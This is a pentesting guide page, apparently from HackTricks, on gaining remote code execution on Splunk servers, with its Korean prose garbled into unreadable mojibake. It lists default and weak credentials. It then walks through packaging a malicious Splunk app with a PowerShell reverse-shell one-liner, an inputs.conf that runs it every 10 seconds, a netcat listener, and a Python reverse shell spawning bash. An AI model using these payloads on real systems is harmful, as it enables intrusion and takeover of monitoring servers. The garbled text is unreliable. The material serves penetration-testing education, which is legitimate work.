# 8089 - Splunkd íœí…ŒìŠ¤íŒ…

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ **ì œë¡œë¶€í„° ì˜ì›…ì´ ë˜ëŠ” AWS í•´í‚¹ ë°°ìš°ê¸°**</summary>

ë‹¤ë¥¸ ë°©ë²•ìœ¼ë¡œ HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ **í•˜ê±°ë‚˜ **HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ê³  ì‹¶ë‹¤ë©´ [**êµ¬ë… ìš”ê¸ˆì œ**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì™œê·¸**](https://peass.creator-spring.com)ë¥¼ êµ¬ë§¤í•˜ì„¸ìš”
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”, ë‹¹ì‚¬ì˜ ë…ì  [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f)ì— ê°€ì…í•˜ê±°ë‚˜ [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ê°€ì…í•˜ê±°ë‚˜** Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ê³  ì‹¶ë‹¤ë©´ PRì„ ì œì¶œí•˜ì—¬** [**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— ê¸°ì—¬í•˜ì„¸ìš”.

</details>

## **ê¸°ë³¸ ì •ë³´**

Splunkì€ **ë¡œê·¸ ë¶„ì„ ë„êµ¬**ë¡œ, **ë°ì´í„° ìˆ˜ì§‘, ë¶„ì„ ë° ì‹œê°í™”**ì— ì¤‘ìš”í•œ ì—­í• ì„ í•©ë‹ˆë‹¤. ì´ˆê¸° ëª©ì ì€ **SIEM (ë³´ì•ˆ ì •ë³´ ë° ì´ë²¤íŠ¸ ê´€ë¦¬)** ë„êµ¬ë¡œ ì‚¬ìš©ë˜ì§€ ì•Šì•˜ì§€ë§Œ, **ë³´ì•ˆ ëª¨ë‹ˆí„°ë§** ë° **ë¹„ì¦ˆë‹ˆìŠ¤ ë¶„ì„** ë¶„ì•¼ì—ì„œ ì¸ê¸°ë¥¼ ì–»ì—ˆìŠµë‹ˆë‹¤.

Splunk ë°°í¬ëŠ” ì¢…ì¢… **ë¯¼ê°í•œ ë°ì´í„°**ë¥¼ ì €ì¥í•˜ê³  ì‹œìŠ¤í…œì„ ì¹¨í•´í•˜ëŠ” ê²½ìš° ì ì¬ì ì¸ ê³µê²©ìì—ê²Œ **ê°€ì¹˜ ìˆëŠ” ì •ë³´ì›**ìœ¼ë¡œ ì‘ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. **ê¸°ë³¸ í¬íŠ¸:** 8089
```
PORT     STATE SERVICE VERSION
8089/tcp open  http    Splunkd httpd
```
{% hint style="info" %}
**ìŠ¤í”Œë í¬ ì›¹ ì„œë²„ëŠ” ê¸°ë³¸ì ìœ¼ë¡œ í¬íŠ¸ 8000ì—ì„œ ì‹¤í–‰ë©ë‹ˆë‹¤**.
{% endhint %}

## ì—´ê±°

### ë¬´ë£Œ ë²„ì „

ìŠ¤í”Œë í¬ ì—”í„°í”„ë¼ì´ì¦ˆ í‰ê°€íŒì€ **60ì¼ í›„ì— ë¬´ë£Œ ë²„ì „ìœ¼ë¡œ ì „í™˜**ë˜ë©° **ì¸ì¦ì´ í•„ìš”í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤**. ì‹œìŠ¤í…œ ê´€ë¦¬ìê°€ ìŠ¤í”Œë í¬ í‰ê°€íŒì„ ì„¤ì¹˜í•˜ì—¬ í…ŒìŠ¤íŠ¸í•˜ëŠ” ê²ƒì€ í”í•œ ì¼ì´ë©°, **ê·¸ í›„ ìŠí˜€ì§€ê¸° ì‰½ìŠµë‹ˆë‹¤**. ì´ëŠ” ì¸ì¦ í˜•íƒœê°€ ì—†ëŠ” ë¬´ë£Œ ë²„ì „ìœ¼ë¡œ ìë™ ì „í™˜ë˜ì–´ í™˜ê²½ì— ë³´ì•ˆ í—ˆì ì„ ë„ì…í•©ë‹ˆë‹¤. ì¼ë¶€ ì¡°ì§ì€ ì˜ˆì‚° ì œì•½ìœ¼ë¡œ ì¸í•´ ë¬´ë£Œ ë²„ì „ì„ ì„ íƒí•  ìˆ˜ ìˆìœ¼ë©°, ì‚¬ìš©ì/ì—­í•  ê´€ë¦¬ê°€ ì—†ì„ ë•Œì˜ ì˜í–¥ì„ ì™„ì „íˆ ì´í•´í•˜ì§€ ëª»í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### ê¸°ë³¸ ìê²© ì¦ëª…

ì´ì „ ë²„ì „ì˜ ìŠ¤í”Œë í¬ì—ì„œëŠ” ê¸°ë³¸ ìê²© ì¦ëª…ì´ **`admin:changeme`**ìœ¼ë¡œ ì„¤ì •ë˜ì–´ ìˆìœ¼ë©°, ë¡œê·¸ì¸ í˜ì´ì§€ì— í¸ë¦¬í•˜ê²Œ í‘œì‹œë©ë‹ˆë‹¤.\
ê·¸ëŸ¬ë‚˜ **ìµœì‹  ë²„ì „ì˜ ìŠ¤í”Œë í¬**ëŠ” **ì„¤ì¹˜ ê³¼ì • ì¤‘ì— ìê²© ì¦ëª…ì„ ì„¤ì •**í•©ë‹ˆë‹¤. ê¸°ë³¸ ìê²© ì¦ëª…ì´ ì‘ë™í•˜ì§€ ì•ŠëŠ” ê²½ìš° `admin`, `Welcome`, `Welcome1`, `Password123` ë“±ê³¼ ê°™ì€ ì¼ë°˜ì ì¸ ì•½í•œ ì•”í˜¸ë¥¼ í™•ì¸í•˜ëŠ” ê²ƒì´ ì¢‹ìŠµë‹ˆë‹¤.

### ì •ë³´ íšë“

ìŠ¤í”Œë í¬ì— ë¡œê·¸ì¸í•˜ë©´ **ë°ì´í„°ë¥¼ íƒìƒ‰**í•˜ê³  **ë³´ê³ ì„œë¥¼ ì‹¤í–‰**í•˜ë©° **ëŒ€ì‹œë³´ë“œë¥¼ ìƒì„±**í•˜ê³ , ìŠ¤í”Œë í¬ë² ì´ìŠ¤ ë¼ì´ë¸ŒëŸ¬ë¦¬ì—ì„œ **ì‘ìš© í”„ë¡œê·¸ë¨ì„ ì„¤ì¹˜**í•˜ê³  ì‚¬ìš©ì ì •ì˜ ì‘ìš© í”„ë¡œê·¸ë¨ì„ ì„¤ì¹˜í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
ë˜í•œ ì½”ë“œë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤: ìŠ¤í”Œë í¬ì—ëŠ” ì„œë²„ ì¸¡ Django ì‘ìš© í”„ë¡œê·¸ë¨, REST ì—”ë“œí¬ì¸íŠ¸, ìŠ¤í¬ë¦½íŠ¸ ì…ë ¥ ë° ê²½ë³´ ìŠ¤í¬ë¦½íŠ¸ì™€ ê°™ì´ **ì½”ë“œë¥¼ ì‹¤í–‰í•˜ëŠ” ì—¬ëŸ¬ ë°©ë²•**ì´ ìˆìŠµë‹ˆë‹¤. ìŠ¤í”Œë í¬ ì„œë²„ì—ì„œ ì›ê²© ì½”ë“œ ì‹¤í–‰ì„ ì–»ëŠ” ì¼ë°˜ì ì¸ ë°©ë²•ì€ ìŠ¤í¬ë¦½íŠ¸ ì…ë ¥ì„ ì‚¬ìš©í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤.

ë˜í•œ, ìŠ¤í”Œë í¬ëŠ” Windows ë˜ëŠ” Linux í˜¸ìŠ¤íŠ¸ì— ì„¤ì¹˜í•  ìˆ˜ ìˆìœ¼ë¯€ë¡œ, ìŠ¤í¬ë¦½íŠ¸ ì…ë ¥ì„ ë§Œë“¤ì–´ Bash, PowerShell ë˜ëŠ” Batch ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### Shodan

* `Splunk ë¹Œë“œ`

## RCE

### ì‚¬ìš©ì ì •ì˜ ì‘ìš© í”„ë¡œê·¸ë¨ ìƒì„±

ì‚¬ìš©ì ì •ì˜ ì‘ìš© í”„ë¡œê·¸ë¨ì€ **Python, Batch, Bash ë˜ëŠ” PowerShell ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‹¤í–‰**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
**ìŠ¤í”Œë í¬ì—ëŠ” Pythonì´ ì„¤ì¹˜ë˜ì–´ ìˆìœ¼ë¯€ë¡œ**, **Windows** ì‹œìŠ¤í…œì—ì„œë„ Python ì½”ë“œë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

[**ì—¬ê¸°**](https://github.com/0xjpuff/reverse\_shell\_splunk)ì—ì„œ ì´ Splunk íŒ¨í‚¤ì§€ë¥¼ ì‚¬ìš©í•˜ì—¬ ë„ì›€ì„ ë°›ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ë¦¬í¬ì§€í† ë¦¬ì˜ **`bin`** ë””ë ‰í† ë¦¬ì—ëŠ” [Python](https://github.com/0xjpuff/reverse\_shell\_splunk/blob/master/reverse\_shell\_splunk/bin/rev.py) ë° [PowerShell](https://github.com/0xjpuff/reverse\_shell\_splunk/blob/master/reverse\_shell\_splunk/bin/run.ps1)ì— ëŒ€í•œ ì˜ˆì œê°€ ìˆìŠµë‹ˆë‹¤. ì´ë¥¼ ë‹¨ê³„ë³„ë¡œ ì§„í–‰í•´ ë´…ì‹œë‹¤.

ì´ë¥¼ ë‹¬ì„±í•˜ê¸° ìœ„í•´ ë¨¼ì € ë‹¤ìŒ ë””ë ‰í† ë¦¬ êµ¬ì¡°ë¥¼ ì‚¬ìš©í•˜ì—¬ ì‚¬ìš©ì ì •ì˜ ìŠ¤í”Œë í¬ ì‘ìš© í”„ë¡œê·¸ë¨ì„ ë§Œë“¤ì–´ì•¼ í•©ë‹ˆë‹¤:
```shell-session
tree splunk_shell/

splunk_shell/
â”œâ”€â”€ bin
â””â”€â”€ default
```
**`bin`** ë””ë ‰í† ë¦¬ì—ëŠ” ì‹¤í–‰í•  **ìŠ¤í¬ë¦½íŠ¸** (ì´ ê²½ìš° **PowerShell** ì—­ìˆ  ì‰˜)ê°€ í¬í•¨ë©ë‹ˆë‹¤. ê¸°ë³¸ ë””ë ‰í† ë¦¬ì—ëŠ” `inputs.conf` íŒŒì¼ì´ ìˆì„ ê²ƒì…ë‹ˆë‹¤. ìš°ë¦¬ì˜ ì—­ìˆ  ì‰˜ì€ **PowerShell ì› ë¼ì´ë„ˆ**ì…ë‹ˆë‹¤:
```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close(
```
[inputs.conf](https://docs.splunk.com/Documentation/Splunk/latest/Admin/Inputsconf) íŒŒì¼ì€ Splunkì—ê²Œ **ì–´ë–¤ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‹¤í–‰í• ì§€**ì™€ ë‹¤ë¥¸ ì¡°ê±´ì„ ì•Œë ¤ì¤ë‹ˆë‹¤. ì—¬ê¸°ì„œ ìš°ë¦¬ëŠ” ì•±ì„ í™œì„±í™”í•˜ê³  Splunkì—ê²Œ 10ì´ˆë§ˆë‹¤ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‹¤í–‰í•˜ë„ë¡ ì§€ì‹œí•©ë‹ˆë‹¤. ê°„ê²©ì€ í•­ìƒ ì´ˆ ë‹¨ìœ„ì´ë©°, ì´ ì„¤ì •ì´ ìˆì„ ë•Œë§Œ ì…ë ¥(ìŠ¤í¬ë¦½íŠ¸)ì´ ì‹¤í–‰ë©ë‹ˆë‹¤.
```shell-session
cat inputs.conf

[script://./bin/rev.py]
disabled = 0
interval = 10
sourcetype = shell

[script://.\bin\run.bat]
disabled = 0
sourcetype = shell
interval = 10
```
ìš°ë¦¬ëŠ” ì‘ìš© í”„ë¡œê·¸ë¨ì´ ë°°í¬ë  ë•Œ ì‹¤í–‰ë˜ê³  PowerShell ì› ë¼ì´ë„ˆë¥¼ ì‹¤í–‰í•  `.bat` íŒŒì¼ì´ í•„ìš”í•©ë‹ˆë‹¤.

ë‹¤ìŒ ë‹¨ê³„ëŠ” `íŒŒì¼ì—ì„œ ì•± ì„¤ì¹˜`ë¥¼ ì„ íƒí•˜ê³  ì‘ìš© í”„ë¡œê·¸ë¨ì„ ì—…ë¡œë“œí•˜ëŠ” ê²ƒì…ë‹ˆë‹¤.

<figure><img src="../.gitbook/assets/image (668).png" alt=""><figcaption></figcaption></figure>

ì•…ì˜ì ì¸ ì‚¬ìš©ì ì •ì˜ ì•±ì„ ì—…ë¡œë“œí•˜ê¸° ì „ì— Netcatì´ë‚˜ [socat](https://linux.die.net/man/1/socat)ì„ ì‚¬ìš©í•˜ì—¬ ë¦¬ìŠ¤ë„ˆë¥¼ ì‹œì‘í•©ì‹œë‹¤.
```shell-session
sudo nc -lnvp 443

listening on [any] 443 ...
```
### `Upload app` í˜ì´ì§€ì—ì„œ ë¸Œë¼ìš°ì¦ˆë¥¼ í´ë¦­í•˜ê³ , ì´ì „ì— ìƒì„±í•œ tarballì„ ì„ íƒí•œ í›„ `Upload`ë¥¼ í´ë¦­í•©ë‹ˆë‹¤. **ì• í”Œë¦¬ì¼€ì´ì…˜ì„ ì—…ë¡œë“œí•˜ëŠ” ì¦‰ì‹œ**, ì• í”Œë¦¬ì¼€ì´ì…˜ì˜ ìƒíƒœê°€ ìë™ìœ¼ë¡œ `Enabled`ë¡œ ì „í™˜ë˜ë©´ì„œ **ë¦¬ë²„ìŠ¤ ì‰˜ì´ ìˆ˜ì‹ ë©ë‹ˆë‹¤**.

#### ë¦¬ëˆ…ìŠ¤

ë§Œì•½ **ë¦¬ëˆ…ìŠ¤ í˜¸ìŠ¤íŠ¸**ì™€ ì‘ì—… ì¤‘ì´ë¼ë©´, ì‚¬ìš©ì ì •ì˜ ì•…ì˜ì  ì•±ì„ ë§Œë“¤ê¸° ì „ì— **`rev.py` íŒŒì´ì¬ ìŠ¤í¬ë¦½íŠ¸ë¥¼ í¸ì§‘**í•´ì•¼ í•©ë‹ˆë‹¤. ë‚˜ë¨¸ì§€ ê³¼ì •ì€ ë™ì¼í•˜ë©°, Netcat ìˆ˜ì‹ ê¸°ì—ì„œ ë¦¬ë²„ìŠ¤ ì‰˜ ì—°ê²°ì„ ë°›ì•„ë“¤ì´ê³  ì‘ì—…ì„ ì‹œì‘í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```python
import sys,socket,os,pty

ip="10.10.14.15"
port="443"
s=socket.socket()
s.connect((ip,int(port)))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn('/bin/bash')
```
### RCE & Privilege Escalation

ë‹¤ìŒ í˜ì´ì§€ì—ì„œëŠ”ì´ ì„œë¹„ìŠ¤ê°€ ì–´ë–»ê²Œ ë‚¨ìš©ë˜ì–´ ê¶Œí•œ ìƒìŠ¹ ë° ì§€ì†ì„± íšë“ì— ì´ìš©ë  ìˆ˜ ìˆëŠ”ì§€ì— ëŒ€í•œ ì„¤ëª…ì„ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤:

{% content-ref url="../linux-hardening/privilege-escalation/splunk-lpe-and-persistence.md" %}
[splunk-lpe-and-persistence.md](../linux-hardening/privilege-escalation/splunk-lpe-and-persistence.md)
{% endcontent-ref %}

## References

* [https://academy.hackthebox.com/module/113/section/1213](https://academy.hackthebox.com/module/113/section/1213)

<details>

<summary><strong>ì œë¡œë¶€í„° ì˜ì›…ì´ ë  ë•Œê¹Œì§€ AWS í•´í‚¹ ë°°ìš°ê¸°</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ê°€ HackTricksì— ê´‘ê³ ë˜ê¸¸ ì›í•˜ê±°ë‚˜** **PDF í˜•ì‹ì˜ HackTricksë¥¼ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**êµ¬ë… ìš”ê¸ˆì œ**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì™œê·¸**](https://peass.creator-spring.com)ë¥¼ êµ¬ì…í•˜ì„¸ìš”
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”, ë‹¹ì‚¬ì˜ ë…ì  [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ê°€ì…í•˜ê±°ë‚˜** íŠ¸ìœ„í„°** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **HackTricks** ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ê¹ƒí—ˆë¸Œ ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ **í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ì„¸ìš”.**

</details>
